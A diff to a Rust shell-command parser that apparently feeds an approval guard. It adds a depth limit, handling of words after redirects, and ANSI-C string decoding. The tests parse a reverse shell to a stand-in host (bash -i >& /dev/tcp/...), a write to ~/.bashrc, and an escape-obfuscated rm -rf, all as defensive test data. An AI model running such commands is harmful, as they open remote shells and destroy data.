@@ -9,15 +9,20 @@
 //! `dynamic`.
 //!
 //! Parsing fails closed. A command with a syntax error, a construct this
-//! module does not follow, or more than [`MAX_COMMANDS`] steps is returned
-//! with `complete: false`, and callers treat it as needing approval and
-//! never offer to allow it permanently.
+//! module does not follow, more than [`MAX_COMMANDS`] steps or more than
+//! [`MAX_DEPTH`] levels of nesting is returned with `complete: false`, and
+//! callers treat it as needing approval and never offer to allow it
+//! permanently.
 use tree_sitter::{Node, Parser};
 
 /// Longest command text that is parsed at all.
 pub const MAX_BYTES: usize = 64 * 1024;
 /// Most simple commands followed in one command line.
 pub const MAX_COMMANDS: usize = 200;
+/// Deepest nesting of statements and words followed. The walk recurses once
+/// per level, so a command nested thousands of levels deep would otherwise
+/// overflow the thread's stack.
+pub const MAX_DEPTH: usize = 100;
 
 /// One word of a command, with quotes removed.
 #[derive(Clone, Debug, PartialEq, Eq)]
@@ -135,6 +140,8 @@ pub fn parse(source: &str) -> Script {
         source: source.as_bytes(),
         script: &mut script,
         pipelines: 0,
+        depth: 0,
+        descriptor: None,
     };
     walker.statement(root, None, false);
     if script.commands.len() > MAX_COMMANDS {
@@ -149,6 +156,12 @@ struct Walker<'a> {
     source: &'a [u8],
     script: &'a mut Script,
     pipelines: usize,
+    /// How many statements and words the walk is inside.
+    depth: usize,
+    /// A descriptor the grammar read as the last redirect's word (the `0` of
+    /// `>& FILE 0>&1`), with where it ends: the redirect starting there
+    /// takes it.
+    descriptor: Option<(String, usize)>,
 }
 
 impl Walker<'_> {
@@ -161,14 +174,37 @@ impl Walker<'_> {
             self.script.problem = Some(format!("the command uses {what}"));
         }
     }
+    /// Go one level deeper: `false`, and the command fails closed, past
+    /// [`MAX_DEPTH`]. Every `true` is paired with `self.depth -= 1`.
+    fn enter(&mut self) -> bool {
+        if self.depth >= MAX_DEPTH {
+            self.script.complete = false;
+            if self.script.problem.is_none() {
+                self.script.problem = Some("the command is nested too deeply to read ahead".into());
+            }
+            return false;
+        }
+        self.depth += 1;
+        true
+    }
 
     /// Walk a statement; `pipe` is its place in a pipeline.
     fn statement(&mut self, node: Node, pipe: Option<(usize, usize, usize)>, substituted: bool) {
-        if self.script.commands.len() > MAX_COMMANDS {
+        if self.script.commands.len() > MAX_COMMANDS || !self.enter() {
             return;
         }
+        self.statement_kind(node, pipe, substituted);
+        self.depth -= 1;
+    }
+
+    fn statement_kind(
+        &mut self,
+        node: Node,
+        pipe: Option<(usize, usize, usize)>,
+        substituted: bool,
+    ) {
         match node.kind() {
-            "command" => self.command(node, pipe, substituted, Vec::new()),
+            "command" => self.command(node, pipe, substituted, Vec::new(), Vec::new()),
             "redirected_statement" => self.redirected(node, pipe, substituted),
             "pipeline" => {
                 let parts: Vec<Node> = named_children(node)
@@ -285,6 +321,7 @@ impl Walker<'_> {
 
     fn redirected(&mut self, node: Node, pipe: Option<(usize, usize, usize)>, substituted: bool) {
         let mut redirects = Vec::new();
+        let mut arguments = Vec::new();
         let mut after = Vec::new();
         let mut body = None;
         let mut cursor = node.walk();
@@ -295,7 +332,11 @@ impl Walker<'_> {
                 continue;
             }
             match child.kind() {
-                "file_redirect" | "herestring_redirect" => redirects.push(self.redirect(child)),
+                "file_redirect" | "herestring_redirect" => {
+                    let (redirect, more) = self.redirect(child);
+                    redirects.push(redirect);
+                    arguments.extend(more);
+                }
                 "heredoc_redirect" => {
                     let (redirect, rest) = self.heredoc(child);
                     redirects.push(redirect);
@@ -310,7 +351,7 @@ impl Walker<'_> {
             return;
         };
         if body.kind() == "command" {
-            self.command(body, pipe, substituted, redirects);
+            self.command(body, pipe, substituted, redirects, arguments);
             // `cat <<EOF | sh`: the grammar puts `| sh` inside the heredoc
             // redirect; it continues the command's pipeline.
             if pipe.is_none() {
@@ -328,6 +369,9 @@ impl Walker<'_> {
                 }
             }
         } else {
+            if !arguments.is_empty() {
+                self.unsupported("words after a redirect of a compound command");
+            }
             // A compound statement with redirects: every step shares them.
             let start = self.script.commands.len();
             self.statement(body, pipe, substituted);
@@ -340,12 +384,15 @@ impl Walker<'_> {
         }
     }
 
+    /// A simple command; `arguments` are words the grammar put after its
+    /// redirects (`> FILE more`), which Bash passes to the program.
     fn command(
         &mut self,
         node: Node,
         pipe: Option<(usize, usize, usize)>,
         substituted: bool,
         mut redirects: Vec<Redirect>,
+        arguments: Vec<Word>,
     ) {
         let mut simple = Simple {
             pipeline: pipe,
@@ -363,7 +410,9 @@ impl Walker<'_> {
                     simple.words.insert(0, word);
                 }
                 (Some("redirect"), _) | (_, "file_redirect" | "herestring_redirect") => {
-                    redirects.push(self.redirect(child))
+                    let (redirect, more) = self.redirect(child);
+                    redirects.push(redirect);
+                    simple.words.extend(more);
                 }
                 (_, "variable_assignment") => {
                     simple.assignments.push(self.text(child));
@@ -374,17 +423,29 @@ impl Walker<'_> {
                 _ => simple.words.push(self.word(child)),
             }
         }
+        simple.words.extend(arguments);
         simple.redirects = redirects;
         self.script.commands.push(simple);
     }
 
-    fn redirect(&mut self, node: Node) -> Redirect {
+    /// A redirect, and the words after its target: the grammar reads
+    /// `> FILE more words` as one redirect, but Bash writes to FILE and
+    /// passes the other words to the program.
+    fn redirect(&mut self, node: Node) -> (Redirect, Vec<Word>) {
         let mut redirect = Redirect {
             op: String::new(),
             fd: None,
             target: None,
             input: None,
         };
+        let mut more = Vec::new();
+        if let Some((fd, _)) = self
+            .descriptor
+            .take()
+            .filter(|(_, end)| *end == node.start_byte())
+        {
+            redirect.fd = Some(fd);
+        }
         let mut cursor = node.walk();
         for (index, child) in node.children(&mut cursor).enumerate() {
             if !child.is_named() {
@@ -395,12 +456,25 @@ impl Walker<'_> {
                 (Some("descriptor"), _) | (_, "file_descriptor") => {
                     redirect.fd = Some(self.text(child))
                 }
-                _ => {
+                _ if redirect.target.is_none() => {
                     let word = self.word(child);
                     if node.kind() == "herestring_redirect" {
                         redirect.input = Some(word.text.clone());
                     }
                     redirect.target = Some(word);
+                }
+                _ => {
+                    let word = self.word(child);
+                    let next = self.source.get(child.end_byte()).copied();
+                    if !word.dynamic
+                        && word.text.chars().all(|c| c.is_ascii_digit())
+                        && matches!(next, Some(b'<' | b'>'))
+                    {
+                        // `0` in `>& FILE 0>&1`: the next redirect's descriptor.
+                        self.descriptor = Some((word.text, child.end_byte()));
+                    } else {
+                        more.push(word);
+                    }
                 }
             }
         }
@@ -408,7 +482,7 @@ impl Walker<'_> {
             redirect.op = "<<<".into();
             redirect.target = None;
         }
-        redirect
+        (redirect, more)
     }
 
     /// A heredoc and whatever follows it on its first line (`<<EOF | sh`).
@@ -450,12 +524,29 @@ impl Walker<'_> {
             self.statement(node, None, true);
             return;
         }
+        if !self.enter() {
+            return;
+        }
         for child in named_children(node) {
             self.collect_substitutions(child);
         }
+        self.depth -= 1;
     }
 
     fn word(&mut self, node: Node) -> Word {
+        if !self.enter() {
+            return Word {
+                text: self.text(node),
+                dynamic: true,
+                glob: false,
+            };
+        }
+        let word = self.word_kind(node);
+        self.depth -= 1;
+        word
+    }
+
+    fn word_kind(&mut self, node: Node) -> Word {
         match node.kind() {
             "word" | "number" | "file_descriptor" | "variable_name" | "extglob_pattern" => {
                 let text = unescape(&self.text(node));
@@ -478,15 +569,23 @@ impl Walker<'_> {
                 }
             }
             "ansi_c_string" => {
+                // `$'\x72m'` is `rm`: Bash decodes the escapes before it runs.
                 let text = self.text(node);
-                Word {
-                    text: text
-                        .strip_prefix("$'")
-                        .and_then(|t| t.strip_suffix('\''))
-                        .unwrap_or(&text)
-                        .to_owned(),
-                    dynamic: false,
-                    glob: false,
+                let inner = text
+                    .strip_prefix("$'")
+                    .and_then(|t| t.strip_suffix('\''))
+                    .unwrap_or(&text);
+                match ansi_c(inner) {
+                    Some(decoded) => Word {
+                        text: decoded,
+                        dynamic: false,
+                        glob: false,
+                    },
+                    None => Word {
+                        text,
+                        dynamic: true,
+                        glob: false,
+                    },
                 }
             }
             "string" | "translated_string" => {
@@ -588,6 +687,86 @@ fn unescape(raw: &str) -> String {
         }
     }
     out
+}
+
+/// The text of a `$'…'` string with its escapes decoded as Bash decodes them
+/// (`\n`, `\x72`, `\162`, `é`, `\cA`, …). `None` when the result is not
+/// text ShadowCode can follow: a NUL, which cuts the word short, or bytes
+/// that are not UTF-8.
+fn ansi_c(raw: &str) -> Option<String> {
+    fn push(out: &mut Vec<u8>, c: char) {
+        out.extend_from_slice(c.encode_utf8(&mut [0; 4]).as_bytes());
+    }
+    /// Up to `max` more digits in `radix`, after `first` if there is one.
+    fn digits(
+        chars: &mut std::iter::Peekable<std::str::Chars>,
+        radix: u32,
+        max: usize,
+        first: Option<u32>,
+    ) -> Option<u32> {
+        let mut value = first;
+        for _ in 0..max {
+            let Some(digit) = chars.peek().and_then(|c| c.to_digit(radix)) else {
+                break;
+            };
+            value = Some(value.unwrap_or(0) * radix + digit);
+            chars.next();
+        }
+        value
+    }
+    let mut out = Vec::with_capacity(raw.len());
+    let mut chars = raw.chars().peekable();
+    while let Some(c) = chars.next() {
+        if c != '\\' {
+            push(&mut out, c);
+            continue;
+        }
+        let Some(escape) = chars.next() else {
+            out.push(b'\\');
+            break;
+        };
+        match escape {
+            'a' => out.push(0x07),
+            'b' => out.push(0x08),
+            'e' | 'E' => out.push(0x1b),
+            'f' => out.push(0x0c),
+            'n' => out.push(b'\n'),
+            'r' => out.push(b'\r'),
+            't' => out.push(b'\t'),
+            'v' => out.push(0x0b),
+            '\\' | '\'' | '"' | '?' => push(&mut out, escape),
+            '0'..='7' => {
+                let value = digits(&mut chars, 8, 2, escape.to_digit(8))?;
+                out.push((value & 0xff) as u8);
+            }
+            'x' => match digits(&mut chars, 16, 2, None) {
+                Some(value) => out.push(value as u8),
+                None => out.extend_from_slice(b"\\x"),
+            },
+            'u' | 'U' => {
+                let max = if escape == 'u' { 4 } else { 8 };
+                match digits(&mut chars, 16, max, None) {
+                    Some(value) => push(&mut out, char::from_u32(value)?),
+                    None => {
+                        out.push(b'\\');
+                        push(&mut out, escape);
+                    }
+                }
+            }
+            'c' => match chars.next() {
+                Some(control) => out.push((control as u32 & 0x1f) as u8),
+                None => out.extend_from_slice(b"\\c"),
+            },
+            other => {
+                out.push(b'\\');
+                push(&mut out, other);
+            }
+        }
+    }
+    if out.contains(&0) {
+        return None;
+    }
+    String::from_utf8(out).ok()
 }
 
 /// Text inside double quotes: only `\"`, `\\`, `\$` and `` \` `` are escapes.
@@ -695,6 +874,95 @@ mod tests {
         assert!(!parse(&"true;".repeat(MAX_COMMANDS + 5)).complete);
         assert!(!parse(&"a".repeat(MAX_BYTES + 1)).complete);
         assert!(parse("for f in *.txt; do wc -l \"$f\"; done").control_flow);
+    }
+
+    #[test]
+    fn deep_nesting_fails_closed_without_overflowing_the_stack() {
+        // A Tokio worker's stack: thousands of nested subshells or
+        // substitutions fit in MAX_BYTES and used to overflow it.
+        let levels = 15_000;
+        let subshells = format!("{}true{}", "( ".repeat(levels), " )".repeat(levels));
+        let substitutions = format!("{}true{}", "echo $(".repeat(7_000), ")".repeat(7_000));
+        std::thread::Builder::new()
+            .stack_size(2 * 1024 * 1024)
+            .spawn(move || {
+                for source in [subshells, substitutions] {
+                    assert!(source.len() <= MAX_BYTES);
+                    let script = parse(&source);
+                    assert!(!script.complete);
+                    assert_eq!(
+                        script.problem.as_deref(),
+                        Some("the command is nested too deeply to read ahead")
+                    );
+                }
+            })
+            .unwrap()
+            .join()
+            .unwrap();
+        // Ordinary nesting is still read.
+        let script = parse("( cd src && echo $(git rev-parse $(echo HEAD)) )");
+        assert!(script.complete, "{:?}", script.problem);
+    }
+
+    #[test]
+    fn a_redirect_takes_one_word_and_the_rest_are_arguments() {
+        let words = |c: &Simple| c.words.iter().map(|w| w.text.clone()).collect::<Vec<_>>();
+        let script = parse("cat secret > ~/.bashrc foo");
+        let cat = &script.commands[0];
+        assert_eq!(words(cat), ["cat", "secret", "foo"]);
+        assert_eq!(cat.redirects[0].writes_file().unwrap().text, "~/.bashrc");
+        let script = parse("echo a > f b c 2>&1");
+        assert_eq!(words(&script.commands[0]), ["echo", "a", "b", "c"]);
+        assert_eq!(
+            script.commands[0].redirects[0]
+                .target
+                .as_ref()
+                .unwrap()
+                .text,
+            "f"
+        );
+        assert_eq!(script.commands[0].redirects[1].fd.as_deref(), Some("2"));
+        // `0>&1` right after a target is a descriptor, not an argument.
+        let shell = parse("bash -i >& /dev/tcp/h.example/1 0>&1");
+        let bash = &shell.commands[0];
+        assert_eq!(words(bash), ["bash", "-i"]);
+        assert_eq!(
+            bash.redirects[0].target.as_ref().unwrap().text,
+            "/dev/tcp/h.example/1"
+        );
+        assert_eq!(bash.redirects[1].fd.as_deref(), Some("0"));
+        assert_eq!(bash.redirects[1].target.as_ref().unwrap().text, "1");
+        let here = parse("cat <<< 'text' more");
+        assert_eq!(words(&here.commands[0]), ["cat", "more"]);
+        assert_eq!(here.commands[0].input(), Some("text"));
+    }
+
+    #[test]
+    fn ansi_c_strings_are_decoded() {
+        let script = parse(r"$'\x72m' -rf $'sr\143' $'a\tb' $'café'");
+        let words: Vec<_> = script.commands[0]
+            .words
+            .iter()
+            .map(|w| (w.text.as_str(), w.dynamic))
+            .collect();
+        assert_eq!(
+            words,
+            [
+                ("rm", false),
+                ("-rf", false),
+                ("src", false),
+                ("a\tb", false),
+                ("café", false)
+            ]
+        );
+        let path = parse(r"cargo test --manifest-path=$'\x2e\x2e/other/Cargo.toml'");
+        assert_eq!(
+            path.commands[0].words[2].text,
+            "--manifest-path=../other/Cargo.toml"
+        );
+        // A NUL cuts the word short in Bash: not followed.
+        assert!(parse(r"rm $'a\0b'").commands[0].args()[0].dynamic);
+        assert_eq!(parse(r"echo $'\q\x'").commands[0].args()[0].text, r"\q\x");
     }
 
     #[test]
